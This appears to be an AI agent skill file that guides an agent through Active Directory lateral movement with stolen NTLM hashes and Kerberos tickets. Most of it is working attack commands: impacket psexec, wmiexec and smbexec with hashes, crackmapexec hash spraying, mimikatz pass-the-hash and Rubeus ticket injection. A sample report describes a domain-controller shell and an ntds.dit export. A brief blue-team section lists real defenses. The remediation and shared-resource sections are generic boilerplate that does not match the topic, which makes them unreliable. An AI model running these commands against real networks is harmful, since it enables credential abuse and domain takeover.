---
name: pass-the-hash-and-ticket
description: >
  Execute lateral movement within Active Directory environments using credential material (NTLM hashes and Kerberos tickets) instead of plaintext passwords. Use this skill when engaging in red team operations or internal network penetration tests to expand access, bypass authentication portals, and achieve Domain Dominance without relying on crackable passwords.
domain: cybersecurity
subdomain: red-teaming
category: Lateral Movement
difficulty: advanced
estimated_time: "3-5 hours"
mitre_attack:
  tactics: [TA0008, TA0006]
  techniques: [T1550.002, T1550.003]
platforms: [windows, linux]
tags: [active-directory, pass-the-hash, pass-the-ticket, lateral-movement, mimikatz, impacket, kerberos, ntlm, red-team]
tools: [mimikatz, impacket, rubeus, proxychains]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Pass the Hash (PtH) and Pass the Ticket (PtT)

## When to Use
- After successfully dumping credentials (SAM, LSASS) on a breached Windows workstation.
- When attempting to move laterally to a Domain Controller or high-value server without plaintext credentials.
- During Red Team engagements utilizing compromised NTLM hashes or Kerberos TGT/TGS tickets.
- When building automated lateral movement chains in tools like Cobalt Strike or Empire.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Pass the Hash (PtH) Overview

```bash
# Concept: Windows NTLM authentication doesn't transmit plaintext passwords over the network.
# It uses the NT Hash. If we possess the NT Hash, we can authenticate directly to services 
# (SMB, WMI, WinRM) as that user without ever needing the cleartext password.

# Required: The victim's NT Hash (e.g., from Mimikatz sekurlsa::logonpasswords or secretsdump.py)
# Format: LM_HASH:NT_HASH (often LM hash is blank/generic e.g., aad3b435b51404eeaad3b435b51404ee)
# NT Hash Example: 8846f7eaee8fb117ad06bdd830b7586c
```

### Phase 2: Pass the Hash Execution (Linux/Impacket)

```bash
# From an attacker Linux machine routing into the network, Impacket is the tool of choice.

HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
TARGET="10.10.10.20"
USER="Administrator"

# 1. Psexec.py (Requires SMB access, writes a service payload - Loud but effective)
impacket-psexec -hashes $HASH $USER@$TARGET

# 2. Wmiexec.py (Utilizes WMI, much stealthier, no service bin dropped)
impacket-wmiexec -hashes $HASH $USER@$TARGET

# 3. Smbexec.py (Uses native SMB, creates ephemeral services)
impacket-smbexec -hashes $HASH $USER@$TARGET

# 4. CrackMapExec (Spray the hash across a subnet to see where this user has Admin rights)
crackmapexec smb 10.10.10.0/24 -u $USER -H $HASH --local-auth
```

### Phase 3: Pass the Hash Execution (Windows/Native)

```powershell
# From a compromised Windows box moving to another Windows box.

# 1. Using Mimikatz to spawn a new CMD prompt running in the security context of the compromised hash.
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP.LOCAL /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe

# The new CMD window will open. If you type 'whoami' it may still show your original user,
# BUT network authentication will occur as the Administrator!

# Test it:
dir \\dc01.corp.local\C$
```

### Phase 4: Pass the Ticket (PtT) Overview

```bash
# Concept: Kerberos is the default AD authentication protocol.
# If we dump a valid Kerberos TGT (Ticket Granting Ticket) or TGS (Service Ticket)
# (.kirbi or .ccache format), we can inject it into our session memory to impersonate the user.
# PtT is significantly stealthier than PtH.

# Extraction:
# Windows (Rubeus): Rubeus.exe dump /nowrap
# Linux (Impacket/secretsdump)
```

### Phase 5: Pass the Ticket Execution (Windows/Rubeus)

```powershell
# 1. We have a dumped ticket (base64 or .kirbi format) from a high privilege user.

# 2. Inject the ticket into our current session memory using Rubeus
Rubeus.exe ptt /ticket:base64_string_here_or_file.kirbi

# 3. Verify the ticket is in memory
klist

# 4. Access the target network resource, Kerberos will authenticate us transparently
dir \\dc01.corp.local\C$
```

### Phase 6: Pass the Ticket Execution (Linux/Impacket)

```bash
# We have a .ccache file (or converted a .kirbi to .ccache)

# 1. Set the KRB5CCNAME environmental variable to point to the ticket
export KRB5CCNAME=/path/to/ticket.ccache

# 2. Use Impacket tools with the `-k` (Use Kerberos) and `-no-pass` flags.
impacket-wmiexec -k -no-pass dc01.corp.local
```

## 🔵 Blue Team Detection & Defense
- **KB2871997 / LSA Protection**: Enable LSA protection (RunAsPPL) to stop Mimikatz from dumping hashes and tickets from LSASS memory.
- **Disable NTLM**: If the network supports it, disable NTLM entirely forcing the network to on Kerberos, mitigating classic Pass the Hash.
- **Privileged Access Workstations (PAW)**: Domain Admins should only log in to highly secured PAWs. If an Admin logs into a standard compromised workstation, their Hashes/Tickets are left in memory for attackers to steal. Tiered Administration models prevent this.
- **Event Logging**: Monitor Windows Event Alerts. PtH often triggers Event ID 4624 (Logon Type 9 - `NewCredentials`). PtT triggers anomalous Kerberos Ticket requests (Event ID 4769).

## Key Concepts
| Concept | Description |
|---------|-------------|
| NT Hash | The cryptographic representation of a Windows password used in NTLM authentication |
| Kerberos | The default Active Directory authentication protocol based on securely issued Tickets |
| TGT | Ticket Granting Ticket; the primary Kerberos ticket proving identity. Can request any resource |
| LSASS | Local Security Authority Subsystem Service; stores credentials in memory for SSO |
| Impersonation | Faking a digital identity without knowing their plaintext security password |

## Output Format
```
Lateral Movement Execution Report
=================================
Source Node: Workstation-05 (10.10.10.55)
Target Node: DC-01 (10.10.10.2)
Execution Method: Pass the Hash (Impacket-WMIexec)

Compromised Identity: CORP\Svc_Backup
NTLM Hash: FDB8DEB2D6...

Action Log:
1. Executed wmiexec targeting DC-01 using Svc_Backup hash.
2. Successful authentication via NTLMv2.
3. Semi-interactive shell established on Domain Controller.
4. Executed payload to export ntds.dit (Domain Database).

OPSEC Status: Moderate. WMIexec creates Event ID 4624 Logon Type 3, but bypasses noisy service creation compared to PsExec.
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- MITRE ATT&CK: [Pass the Hash (T1550.002)](https://attack.mitre.org/techniques/T1550/002/)
- MITRE ATT&CK: [Pass the Ticket (T1550.003)](https://attack.mitre.org/techniques/T1550/003/)
- SpecterOps: [Rubeus Documentation](https://github.com/GhostPack/Rubeus)
- SecureAuth: [Impacket Documentation](https://github.com/fortra/impacket)
